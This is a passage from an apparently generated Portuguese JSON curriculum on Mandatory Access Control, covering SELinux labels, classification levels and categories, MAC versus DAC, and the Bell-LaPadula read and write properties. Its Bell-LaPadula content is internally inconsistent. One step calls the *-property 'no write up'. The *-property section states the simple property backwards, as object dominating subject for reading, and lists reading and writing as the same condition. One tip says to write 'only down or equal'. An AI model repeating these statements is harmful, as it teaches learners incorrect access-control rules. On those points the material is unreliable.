                              "practicalExample": "Em um sistema SELinux, um processo 'cat' (sujeito com rótulo user_u:system_r:cat_t:s0) tenta ler /etc/shadow (objeto com rótulo system_u:object_r:shadow_t:s0). Verifique rótulos com 'ps -eZ' e 'ls -Zd', aplique regra de leitura: se domínio do sujeito permite, acesso concedido; senão, AVC denial no audit.log.",
                              "finalVerifications": [
                                "Diferencie corretamente 10 pares sujeito/objeto em cenários mistos.",
                                "Explique atribuição de rótulos em um fluxograma completo.",
                                "Simule e resolva uma violação de acesso MAC em lab.",
                                "Traduza logs de SELinux para identificação de sujeito/objeto.",
                                "Compare MAC com DAC em 3 pontos chave.",
                                "Crie uma política básica que proteja um objeto sensível."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção sujeito/objeto (90%+ em testes).",
                                "Compreensão profunda de rótulos e regras de domínio.",
                                "Habilidade em análise de logs e configuração prática.",
                                "Explicações claras e exemplos relevantes.",
                                "Identificação de erros comuns e prevenções.",
                                "Aplicação em cenários reais sem supervisão."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de processos e memória.",
                                "Redes: Controle de acesso em firewalls baseados em labels.",
                                "Programação: Desenvolvimento seguro com contextos de segurança.",
                                "Direito e Ética: Classificações de dados confidenciais."
                              ],
                              "realWorldApplication": "Em ambientes governamentais ou militares, como redes DoD, identificar sujeitos/objetos em MAC previne vazamentos: analistas (sujeitos) acessam apenas docs (objetos) de nível compatível, evitando espionagem como em casos Snowden."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.1.2",
                            "name": "Explicar níveis e categorias de segurança",
                            "description": "Descrever níveis de segurança hierárquicos (ex: Unclassified, Secret, Top Secret) e categorias/compartimentos de informação (ex: Need-to-Know), incluindo como dominância de rótulos é determinada.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Níveis Hierárquicos de Segurança",
                                  "subSteps": [
                                    "Estude os níveis padrão de classificação: Unclassified, Confidential, Secret e Top Secret.",
                                    "Memorize as definições e impactos potenciais de divulgação não autorizada para cada nível.",
                                    "Compare os níveis em termos de hierarquia e restrições de acesso.",
                                    "Crie um diagrama visual representando a hierarquia.",
                                    "Revise exemplos reais de uso em contextos governamentais."
                                  ],
                                  "verification": "Crie um fluxograma ou tabela listando os 4 níveis com definições corretas e hierarquia.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-53 sobre rótulos de segurança",
                                    "Diagramas de classificação DoD",
                                    "Notas em branco para diagrama"
                                  ],
                                  "tips": "Use mnemônicos como 'UCST' (Unclassified, Confidential, Secret, Top Secret) para memorizar.",
                                  "learningObjective": "Identificar e hierarquizar os níveis de segurança padrão em sistemas MAC.",
                                  "commonMistakes": [
                                    "Confundir Confidential com Secret; ignorar que Unclassified ainda pode ter controles."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Categorias e Compartimentos de Informação",
                                  "subSteps": [
                                    "Defina categorias como SCI (Sensitive Compartmented Information) e outros compartimentos como NOFORN.",
                                    "Entenda que categorias são não hierárquicas e baseadas em 'Need-to-Know'.",
                                    "Liste exemplos de categorias comuns em ambientes militares e corporativos.",
                                    "Diferencie níveis (hierárquicos) de categorias (aditivos).",
                                    "Pratique rotulando um documento fictício com múltiplas categorias."
                                  ],
                                  "verification": "Rotule corretamente 3 documentos fictícios com níveis e pelo menos 2 categorias cada.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Guia DoD 5200.01 sobre markings",
                                    "Exemplos de rótulos de documentos classificados",
                                    "Ferramenta de edição de texto"
                                  ],
                                  "tips": "Pense em categorias como 'salas separadas' dentro de um prédio (nível), acessíveis só por necessidade.",
                                  "learningObjective": "Diferenciar e aplicar categorias de segurança além dos níveis hierárquicos.",
                                  "commonMistakes": [
                                    "Tratar categorias como hierárquicas; omitir 'Need-to-Know' em exemplos."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominância de Rótulos de Segurança",
                                  "subSteps": [
                                    "Aprenda a regra: Um rótulo A domina B se nível de A ≥ nível de B e A possui todas as categorias de B.",
                                    "Estude exemplos de dominância e não dominância.",
                                    "Pratique comparando pares de rótulos compostos.",
                                    "Entenda implicações para fluxo de informação em MAC (no read up, no write down).",
                                    "Crie uma tabela de verdade para 4 cenários de dominância."
                                  ],
                                  "verification": "Resolva 5 exercícios de dominância de rótulos com 100% de acerto.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Exercícios de dominância de Bell-LaPadula model",
                                    "Planilha Excel para tabelas",
                                    "Referência CNSSI 4009"
                                  ],
                                  "tips": "Verifique nível primeiro, depois categorias; use 'contém todas' como checklist.",
                                  "learningObjective": "Determinar corretamente se um rótulo domina outro em sistemas MAC.",
                                  "commonMistakes": [
                                    "Ignorar categorias ao comparar; confundir dominância com igualdade."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integração e Aplicação Prática",
                                  "subSteps": [
                                    "Combine níveis, categorias e dominância em um cenário completo.",
                                    "Simule políticas de acesso baseadas em rótulos.",
                                    "Discuta exceções como multilevel security e trusted subjects.",
                                    "Crie um policy document fictício para uma organização.",
                                    "Revise tudo com um quiz autoavaliativo."
                                  ],
                                  "verification": "Desenvolva um exemplo de política de rótulos para um sistema fictício, justificando dominâncias.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Templates de políticas de segurança",
                                    "Quiz online sobre MAC",
                                    "Documentos de exemplo classificados"
                                  ],
                                  "tips": "Sempre pergunte: 'Quem precisa saber?' para validar Need-to-Know.",
                                  "learningObjective": "Integrar conceitos em políticas de segurança MAC acionáveis.",
                                  "commonMistakes": [
                                    "Sobrestimar acesso sem dominância completa; ignorar contexto operacional."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma agência governamental, um documento rotulado 'SECRET//SCI//NOFORN' só pode ser lido por sujeitos com rótulo dominante (ex: TOP SECRET//SCI//NOFORN), garantindo que analistas com SECRET//REL TO USA não acessem SCI sem necessidade comprovada.",
                              "finalVerifications": [
                                "Liste e defina corretamente os 4 níveis hierárquicos.",
                                "Explique Need-to-Know com um exemplo.",
                                "Determine dominância entre dois rótulos compostos dados.",
                                "Identifique 3 categorias comuns e seu propósito.",
                                "Descreva implicações de violação de dominância em MAC.",
                                "Crie um rótulo válido para um cenário dado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na hierarquia de níveis (100% correto).",
                                "Compreensão clara de categorias não hierárquicas.",
                                "Aplicação correta de regras de dominância em 90% dos casos.",
                                "Integração de Need-to-Know em exemplos.",
                                "Uso de terminologia padrão (ex: DoD markings).",
                                "Capacidade de criar rótulos compostos realistas."
                              ],
                              "crossCurricularConnections": [
                                "História: Evolução de classificações desde WWII (ex: Manhattan Project).",
                                "Direito: Leis como Espionage Act e GDPR para proteção de dados.",
                                "Informática: Implementação em SELinux e sistemas operacionais.",
                                "Ética: Dilemas de Need-to-Know vs. transparência organizacional.",
                                "Gestão: Políticas de compliance em RH e treinamento corporativo."
                              ],
                              "realWorldApplication": "Em organizações como NSA ou empresas de defesa (ex: Lockheed Martin), rótulos MAC previnem vazamentos, permitindo que engenheiros acessem apenas 'SECRET//PROJ_X' necessário para seu projeto, reduzindo riscos de insider threats e cumprindo regulamentações como Executive Order 13526."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.5.1.3",
                            "name": "Comparar MAC com DAC",
                            "description": "Analisar diferenças entre Controle de Acesso Mandatório (políticas centrais impostas pelo SO) e Discreto (permissões definidas pelo dono do objeto), destacando vantagens em ambientes de alta segurança.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Fundamentais de MAC e DAC",
                                  "subSteps": [
                                    "Defina MAC: Controle de Acesso Mandatório, onde políticas centrais são impostas pelo sistema operacional ou administrador.",
                                    "Defina DAC: Controle de Acesso Discreto, onde o dono do objeto define permissões para usuários.",
                                    "Identifique componentes chave do MAC: rótulos de segurança (sensibilidade, categorias).",
                                    "Identifique componentes chave do DAC: listas de controle de acesso (ACLs) e permissões de proprietário.",
                                    "Pesquise exemplos reais: SELinux para MAC e permissões Unix para DAC."
                                  ],
                                  "verification": "Crie um glossário com definições e componentes de MAC e DAC, revisado por um par.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do NIST sobre controles de acesso",
                                    "Tutoriais SELinux e Unix permissions",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use diagramas Venn para visualizar sobreposições iniciais nos conceitos.",
                                  "learningObjective": "Compreender as definições e componentes básicos de MAC e DAC.",
                                  "commonMistakes": [
                                    "Confundir MAC com RBAC (Role-Based)",
                                    "Ignorar o papel central do SO no MAC"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Comparar Diferenças Chave entre MAC e DAC",
                                  "subSteps": [
                                    "Compare autoridade de decisão: MAC (admin/SO) vs DAC (dono do objeto).",
                                    "Analise granularidade: MAC (rótulos hierárquicos) vs DAC (permissões individuais).",
                                    "Discuta herança de permissões: MAC (não herdado pelo usuário) vs DAC (herdado pelo dono).",
                                    "Examine enforcement: MAC (kernel-level obrigatório) vs DAC (pode ser contornado pelo dono).",
                                    "Liste 5 diferenças em uma tabela comparativa."
                                  ],
                                  "verification": "Preencha uma tabela de comparação com pelo menos 5 diferenças chave e valide com fontes confiáveis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha ou ferramenta de tabela (Google Sheets)",
                                    "Referências: RFCs de segurança, livros como 'Operating System Security'"
                                  ],
                                  "tips": "Estruture a tabela com colunas: Aspecto, MAC, DAC, Implicações.",
                                  "learningObjective": "Identificar e documentar diferenças estruturais entre MAC e DAC.",
                                  "commonMistakes": [
                                    "Omitir implicações de segurança",
                                    "Confundir DAC com ACLs avançadas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Vantagens e Desvantagens em Contextos de Segurança",
                                  "subSteps": [
                                    "Liste vantagens do MAC: Alta segurança em ambientes classificados, prevenção de vazamentos.",
                                    "Liste desvantagens do MAC: Rigidez, complexidade administrativa.",
                                    "Liste vantagens do DAC: Flexibilidade para usuários, simplicidade.",
                                    "Liste desvantagens do DAC: Risco de mau gerenciamento pelo dono.",
                                    "Discuta cenários: MAC ideal para militar/governo, DAC para ambientes corporativos gerais.",
                                    "Crie um gráfico de prós/contras balanceado."
                                  ],
                                  "verification": "Desenvolva um relatório de 1 página com análise SWOT para MAC vs DAC em alta segurança.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io)",
                                    "Casos de estudo: SELinux em Red Hat, Windows NTFS DAC"
                                  ],
                                  "tips": "Foco em métricas como 'nível de confidencialidade' para priorizar vantagens.",
                                  "learningObjective": "Avaliar forças e fraquezas relativas de MAC e DAC em cenários de alta segurança.",
                                  "commonMistakes": [
                                    "Superestimar flexibilidade do MAC",
                                    "Ignorar overhead de performance no MAC"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Aplicar o Conhecimento em um Cenário Prático",
                                  "subSteps": [
                                    "Escolha um cenário: Sistema militar com dados classificados.",
                                    "Simule escolha: Justifique por que MAC é superior ao DAC nesse caso.",
                                    "Identifique mecanismos: Rótulos em MAC vs ACLs em DAC.",
                                    "Teste conceitualmente: Como um insider threat seria mitigado em cada.",
                                    "Documente lições aprendidas em um resumo."
                                  ],
                                  "verification": "Apresente uma recomendação escrita para um ambiente de alta segurança, justificando MAC sobre DAC.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Simulador virtual (VirtualBox com SELinux)",
                                    "Templates de relatório de segurança"
                                  ],
                                  "tips": "Use analogias: MAC como 'guarda militar' vs DAC como 'chaves de casa'.",
                                  "learningObjective": "Aplicar comparação para tomada de decisão em contextos reais.",
                                  "commonMistakes": [
                                    "Generalizar sem contexto específico",
                                    "Esquecer trade-offs de usabilidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Linux corporativo, DAC permite que um usuário dê permissão total a um arquivo confidencial para um colega não autorizado, potencialmente causando vazamento. Com MAC (SELinux), rótulos de segurança 'top-secret' impedem isso, mesmo se o dono tentar, forçando conformidade com políticas centrais.",
                              "finalVerifications": [
                                "Liste corretamente 5 diferenças principais entre MAC e DAC.",
                                "Explique por que MAC é preferido em ambientes de alta segurança.",
                                "Identifique componentes chave como rótulos em MAC e ACLs em DAC.",
                                "Crie uma tabela comparativa precisa.",
                                "Justifique uma escolha de controle em um cenário dado.",
                                "Discuta pelo menos 2 vantagens/desvantagens de cada."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: Definições corretas de MAC e DAC (30%)",
                                "Profundidade da comparação: Cobertura de diferenças chave (25%)",
                                "Análise contextual: Vantagens em alta segurança (20%)",
                                "Clareza e estrutura: Uso de tabelas/diagramas (15%)",
                                "Aplicação prática: Exemplos e justificativas (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com firewalls baseados em rótulos (MLS).",
                                "Criptografia: Combinação com encriptação para confidencialidade.",
                                "Gestão de Identidade: RBAC como extensão hierárquica do MAC.",
                                "Direito e Ética: Conformidade com regulamentações como GDPR em controles obrigatórios."
                              ],
                              "realWorldApplication": "Em agências governamentais como NSA ou militares, MAC (ex: SELinux/CISCO ISE) previne vazamentos de dados classificados, contrastando com DAC em escritórios onde flexibilidade é priorizada, mas insider threats são mitigados por treinamentos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.5.2",
                        "name": "Modelo Bell-LaPadula para Confidencialidade",
                        "description": "Política clássica de MAC focada em confidencialidade, com regras de leitura e escrita baseadas em dominância de rótulos para prevenir vazamento de informações.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.5.2.1",
                            "name": "Descrever a propriedade de segurança simples (ss-property)",
                            "description": "Explicar a regra 'no read up': um sujeito só pode ler um objeto se seu rótulo domina o rótulo do objeto, evitando leitura de informações de maior classificação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos do modelo Bell-LaPadula e rótulos de segurança",
                                  "subSteps": [
                                    "Estude o conceito de Controle de Acesso Mandatório (MAC) e sua diferença para DAC.",
                                    "Aprenda sobre rótulos de segurança: níveis hierárquicos como Unclassified, Confidential, Secret, Top Secret.",
                                    "Entenda a relação de dominação: rótulo S domina O se nível(S) ≥ nível(O) e categorias(S) ⊇ categorias(O).",
                                    "Visualize diagramas de lattice de segurança para representar dominação.",
                                    "Revise a propriedade *-property (no write up) brevemente para contraste futuro."
                                  ],
                                  "verification": "Crie um diagrama simples de dominação de rótulos e explique verbalmente ou por escrito.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Notebook, acesso à internet para diagramas Bell-LaPadula, papel e caneta para esboços.",
                                  "tips": "Use analogias como 'níveis de prisão' onde prisioneiros de cela baixa não acessam cela alta.",
                                  "learningObjective": "Dominar os conceitos básicos de rótulos e dominação necessários para a ss-property.",
                                  "commonMistakes": "Confundir dominação com igualdade de rótulos; ignorar compartimentos de informação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar a definição formal da propriedade simples de segurança (ss-property)",
                                  "subSteps": [
                                    "Leia a definição: Um sujeito em nível S pode ler objeto em O apenas se S domina O.",
                                    "Memorize o lema 'no read up': proíbe leitura ascendente para preservar confidencialidade.",
                                    "Analise a regra formal: read(S, O) ⇒ label(S) ≥ label(O).",
                                    "Compare com fluxo de informação: impede vazamento de dados sensíveis para sujeitos menos confiáveis.",
                                    "Anote exemplos matemáticos de dominação válida e inválida."
                                  ],
                                  "verification": "Escreva a definição formal da ss-property e um pseudocódigo simples para verificá-la.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Bell-LaPadula (PDF ou wiki), editor de texto.",
                                  "tips": "Repita a frase 'no read up' como mnemônico para lembrar a direção da restrição.",
                                  "learningObjective": "Explicar precisamente a ss-property e sua justificativa de confidencialidade.",
                                  "commonMistakes": "Invertir a direção: achar que é 'no read down'; confundir sujeito com objeto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar exemplos e contraexemplos da ss-property",
                                  "subSteps": [
                                    "Crie um cenário: Sujeito Secret tenta ler Confidential (permitido, pois domina).",
                                    "Contraexemplo: Sujeito Confidential tenta ler Secret (bloqueado, não domina).",
                                    "Inclua compartimentos: Sujeito {Secret, Need-to-Know-A} não lê {Secret, Need-to-Know-B}.",
                                    "Simule em tabela: colunas para sujeito, objeto, domina?, pode ler?.",
                                    "Discuta violações: como isso previne espionagem interna."
                                  ],
                                  "verification": "Preencha uma tabela com 5 cenários e classifique cada um como permitido/bloqueado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Planilha Excel ou Google Sheets para tabelas, exemplos impressos.",
                                  "tips": "Teste cenários edge cases, como rótulos idênticos ou vazios.",
                                  "learningObjective": "Aplicar a ss-property em cenários concretos para internalizar a regra.",
                                  "commonMistakes": "Esquecer categorias além de níveis hierárquicos; permitir leitura sem dominação total."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar a descrição completa da ss-property",
                                  "subSteps": [
                                    "Escreva uma descrição em parágrafo: inclua definição, lema, justificativa e exemplo.",
                                    "Grave um vídeo ou áudio explicando para um 'colega imaginário'.",
                                    "Revise e refine: verifique precisão, clareza e completude.",
                                    "Compare sua descrição com fontes autorizadas.",
                                    "Crie um fluxograma da verificação de leitura."
                                  ],
                                  "verification": "Produza uma descrição escrita de 200-300 palavras que cubra todos os aspectos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Editor de texto, gravador de voz, fluxograma online (ex: Lucidchart).",
                                  "tips": "Estruture como: definição + regra + exemplo + por quê importa.",
                                  "learningObjective": "Descrever a ss-property de forma clara, precisa e autônoma.",
                                  "commonMistakes": "Omitir justificativa de confidencialidade; usar jargão sem explicar."
                                }
                              ],
                              "practicalExample": "Em um sistema militar, um analista com rótulo 'Secret' (nível Secret, sem compartimentos extras) tenta acessar um relatório 'Top Secret'. A ss-property bloqueia a leitura porque 'Secret' não domina 'Top Secret', impedindo que informações críticas vazem para clearance inferior.",
                              "finalVerifications": [
                                "Explicar corretamente o lema 'no read up' e sua direção.",
                                "Definir dominação de rótulos com exemplo hierárquico e de categorias.",
                                "Identificar cenários válidos e inválidos em uma tabela de 5 itens.",
                                "Descrever a justificativa para confidencialidade sem erros.",
                                "Produzir uma descrição escrita precisa e concisa.",
                                "Criar um fluxograma simples da regra de leitura."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição formal da ss-property (100% correto).",
                                "Clareza na explicação de dominação e 'no read up'.",
                                "Uso correto de terminologia (sujeito, objeto, domina).",
                                "Inclusão de exemplos e contraexemplos relevantes.",
                                "Justificativa lógica para preservação de confidencialidade.",
                                "Completude: cobre regra, aplicação e importância."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Relações de ordem parcial e lattices.",
                                "Lógica Formal: Regras de inferência e predicados.",
                                "Ética e Direito: Proteção de dados sensíveis e privacidade.",
                                "Ciência da Computação: Modelos de segurança e fluxos de informação."
                              ],
                              "realWorldApplication": "Aplicada em sistemas classificados do governo (ex: SELinux com MLS), bancos para segregação de dados sensíveis e clouds empresariais para prevenir vazamentos de informações confidenciais entre divisões."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.5.1"
                            ]
                          },
                          {
                            "id": "10.1.6.5.2.2",
                            "name": "Descrever a propriedade estrela (*-property)",
                            "description": "Explicar a regra 'no write down': um sujeito só pode escrever em um objeto se o rótulo do objeto domina o do sujeito, prevenindo downgrading acidental de dados sensíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos do Modelo Bell-LaPadula",
                                  "subSteps": [
                                    "Estude os conceitos básicos de Controle de Acesso Mandatório (MAC).",
                                    "Identifique os dois componentes principais do Bell-LaPadula: propriedade simples de segurança e propriedade estrela (*-property).",
                                    "Aprenda a notação de rótulos de segurança (níveis hierárquicos e categorias não hierárquicas).",
                                    "Entenda o conceito de 'dominação' de rótulos: L1 domina L2 se nível(L1) ≥ nível(L2) e categorias(L1) ⊇ categorias(L2).",
                                    "Diferencie confidencialidade (Bell-LaPadula) de integridade (Biba)."
                                  ],
                                  "verification": "Resuma em 3 frases os fundamentos do Bell-LaPadula e defina dominação de rótulos corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial Bell-LaPadula (RFC ou Wikipedia)",
                                    "Diagrama de rótulos de segurança"
                                  ],
                                  "tips": "Use diagramas visuais para representar níveis de segurança como uma torre hierárquica.",
                                  "learningObjective": "Compreender a base conceitual necessária para a *-property.",
                                  "commonMistakes": "Confundir dominação com igualdade de rótulos; ignorar categorias não hierárquicas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender a Propriedade Simples de Segurança (Pré-requisito)",
                                  "subSteps": [
                                    "Defina a propriedade simples: sujeito pode ler objeto se rótulo(objeto) domina rótulo(sujeito) (no read up).",
                                    "Exemplo: Sujeito Unclassified não lê Top Secret.",
                                    "Pratique com cenários: dado rótulos, determine se leitura é permitida.",
                                    "Compare com DAC (controle de acesso discricionário).",
                                    "Registre exemplos onde violação causaria vazamento de dados."
                                  ],
                                  "verification": "Crie 2 exemplos onde leitura é negada pela propriedade simples e explique por quê.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exemplos de rótulos: Unclassified, Confidential, Secret, Top Secret",
                                    "Ferramenta online de simulador Bell-LaPadula"
                                  ],
                                  "tips": "Pense em 'ler para cima' como escalar uma montanha proibida.",
                                  "learningObjective": "Diferenciar leitura segura da *-property de escrita.",
                                  "commonMistakes": "Inverter a direção: permitir read up em vez de no read up."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detalhar a Propriedade Estrela (*-Property)",
                                  "subSteps": [
                                    "Defina a *-property: sujeito só pode escrever em objeto se rótulo(objeto) domina rótulo(sujeito) (no write down).",
                                    "Explique o propósito: prevenir downgrading acidental de dados sensíveis.",
                                    "Analise formalmente: escrita só se nível(objeto) ≥ nível(sujeito) e categorias adequadas.",
                                    "Diferencie de propriedade simples: leitura (objeto ≥ sujeito) vs escrita (objeto ≥ sujeito).",
                                    "Estude exceções ou downgrades controlados (como trusted subjects)."
                                  ],
                                  "verification": "Escreva a definição exata da *-property e um contra-exemplo de violação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigo original de Bell e LaPadula (1973)",
                                    "Notas de aula sobre MAC"
                                  ],
                                  "tips": "Lembre: 'escreva só para baixo ou igual na hierarquia' – objeto deve ser tão sensível quanto o sujeito.",
                                  "learningObjective": "Descrever precisamente a regra 'no write down' e seu impacto na confidencialidade.",
                                  "commonMistakes": "Confundir com write up; achar que escrita é simétrica à leitura."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Comparar Propriedades",
                                  "subSteps": [
                                    "Crie tabela comparativa: leitura vs escrita sob Bell-LaPadula.",
                                    "Simule cenários mistos: read-write em matriz de sujeitos/objetos.",
                                    "Discuta implicações: fluxo de informação unidirecional para confidencialidade.",
                                    "Identifique sistemas reais usando Bell-LaPadula (ex: SELinux).",
                                    "Debata limitações: falta de integridade, overhead computacional."
                                  ],
                                  "verification": "Resolva 3 cenários de acesso e justifique decisões baseadas em *-property.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Matriz de acesso 4x4 com rótulos",
                                    "Simulador online de Bell-LaPadula"
                                  ],
                                  "tips": "Use matrizes para visualizar permissões; teste edge cases com categorias.",
                                  "learningObjective": "Integrar *-property em fluxos completos de acesso.",
                                  "commonMistakes": "Ignorar transitividade em fluxos multi-step; subestimar categorias."
                                }
                              ],
                              "practicalExample": "Em um sistema militar, um analista com rótulo 'Top Secret {NUCLEAR}' tenta escrever um relatório sobre armas nucleares para um arquivo compartilhado 'Secret {GENERAL}'. A *-property bloqueia, pois 'Secret {GENERAL}' não domina 'Top Secret {NUCLEAR}' (nível inferior e categoria não contida), prevenindo vazamento de detalhes nucleares para usuários Secret genéricos.",
                              "finalVerifications": [
                                "Explicar verbalmente a *-property sem erros em 1 minuto.",
                                "Identificar corretamente 5/5 cenários de write-down violação.",
                                "Desenhar diagrama de dominação para 3 pares de rótulos.",
                                "Comparar *-property com propriedade simples em tabela.",
                                "Discutir risco real de violação sem a regra."
                              ],
                              "assessmentCriteria": [
                                "Definição precisa da *-property (100% match com formal).",
                                "Exemplos corretos sem inversão de regras.",
                                "Uso consistente de 'domina' e 'no write down'.",
                                "Integração com contexto Bell-LaPadula completo.",
                                "Criatividade em cenários práticos sem erros lógicos.",
                                "Clareza na explicação de prevenção de downgrading."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: alinhamento com encriptação por níveis de segurança.",
                                "Redes: implementação em firewalls e VLANs seguras.",
                                "Ética em TI: princípios de least privilege e data protection.",
                                "Matemática: modelagem de relações de ordem parcial (lattices)."
                              ],
                              "realWorldApplication": "Implementado em sistemas como SELinux e FreeBSD MAC, usado em ambientes governamentais (DoD) para proteger dados classificados, prevenindo engenharia social ou erros humanos que causem downgrading de inteligência sensível."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.5.1"
                            ]
                          },
                          {
                            "id": "10.1.6.5.2.3",
                            "name": "Aplicar o modelo em cenários",
                            "description": "Analisar exemplos de acesso permitido/proibido em sistemas multilevel security usando Bell-LaPadula, como em ambientes militares.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar os Princípios Fundamentais do Modelo Bell-LaPadula",
                                  "subSteps": [
                                    "Estude a Simple Security Property (ss-property): nenhum sujeito pode ler um objeto de nível de segurança superior.",
                                    "Estude a Star Property (*-property): nenhum sujeito pode escrever em um objeto de nível de segurança inferior.",
                                    "Identifique os níveis hierárquicos típicos: Unclassified, Confidential, Secret, Top Secret.",
                                    "Revise exemplos básicos de violações em diagramas de fluxo de informação.",
                                    "Anote as implicações para confidencialidade em sistemas multilevel."
                                  ],
                                  "verification": "Crie um resumo de 1 parágrafo explicando ambas as propriedades com um exemplo simples.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação oficial do Bell-LaPadula (PDF ou wiki), diagrama de níveis de segurança.",
                                  "tips": "Use mnemônicos: 'No Read Up' para ss-property e 'No Write Down' para *-property.",
                                  "learningObjective": "Compreender as regras centrais do modelo para análise posterior.",
                                  "commonMistakes": "Confundir leitura com escrita ou inverter as direções das regras."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar e Mapear o Cenário Dado",
                                  "subSteps": [
                                    "Leia o cenário fornecido, identificando sujeitos (usuários/processos) e objetos (arquivos/dados).",
                                    "Atribua níveis de segurança explícitos ou implícitos a cada sujeito e objeto.",
                                    "Crie um diagrama simples (tabela ou fluxograma) mostrando sujeitos, objetos e níveis.",
                                    "Liste todas as operações de acesso propostas (leitura/escrita).",
                                    "Destaque ambiguidades no cenário e resolva com suposições baseadas em contexto militar."
                                  ],
                                  "verification": "Desenhe e valide um diagrama do cenário com pelo menos 3 sujeitos/objetos mapeados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Papel/caneta ou ferramenta de diagrama (Draw.io, Lucidchart), cenário exemplo impresso.",
                                  "tips": "Sempre assuma hierarquia estrita em cenários militares: superior significa nível mais alto.",
                                  "learningObjective": "Mapear componentes de segurança em um contexto realista.",
                                  "commonMistakes": "Ignorar níveis implícitos ou mapear incorretamente hierarquias."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliar Acessos de Leitura Usando ss-Property",
                                  "subSteps": [
                                    "Para cada operação de leitura, compare nível do sujeito com nível do objeto.",
                                    "Aplique 'no read up': permita apenas se nível do sujeito >= nível do objeto.",
                                    "Registre acessos permitidos/proibidos com justificativa.",
                                    "Simule o fluxo: trace o que acontece se violado (ex.: vazamento de info).",
                                    "Teste com variações: altere níveis e reavalie."
                                  ],
                                  "verification": "Lista completa de acessos de leitura com status (permitido/proibido) e razões.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Diagrama do Step 2, planilha para rastrear acessos.",
                                  "tips": "Pense em termos de 'clearance needed': sujeito precisa de clearance igual ou superior.",
                                  "learningObjective": "Aplicar corretamente a regra de confidencialidade para leitura.",
                                  "commonMistakes": "Permitir leitura 'up' por engano ou confundir com Biba (integridade)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Acessos de Escrita Usando *-Property",
                                  "subSteps": [
                                    "Para cada operação de escrita, compare nível do sujeito com nível do objeto.",
                                    "Aplique 'no write down': permita apenas se nível do sujeito <= nível do objeto.",
                                    "Registre acessos permitidos/proibidos com justificativa.",
                                    "Analise impactos de cascata: escrita pode afetar leituras futuras?",
                                    "Integre resultados de leitura para visão completa."
                                  ],
                                  "verification": "Lista completa de acessos de escrita com status e razões, integrada à de leitura.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Planilha atualizada do Step 3, exemplos de fluxos militares.",
                                  "tips": "Evite downgrade acidental: escrita down pode vazar info para níveis baixos.",
                                  "learningObjective": "Aplicar a regra anti-downgrade para prevenir vazamentos.",
